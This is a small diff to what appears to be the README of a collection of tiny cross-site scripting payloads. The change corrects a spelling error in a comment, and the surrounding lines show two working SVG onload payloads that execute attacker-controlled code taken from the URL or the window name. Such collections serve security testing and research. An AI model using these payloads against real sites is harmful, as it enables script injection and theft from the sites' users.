@@ -17,7 +17,7 @@ The DEMO available here: <https://terjanq.github.io/Tiny-XSS-Payloads/index.html
 <!-- If you control the URL -->
 <svg/onload=eval(`'`+URL)>
 
-<!-- If you controll the name, but unsafe-eval not enabled -->
+<!-- If you control the name, but unsafe-eval not enabled -->
 <svg/onload=location=name>
 
 <!-- Just a casual script -->
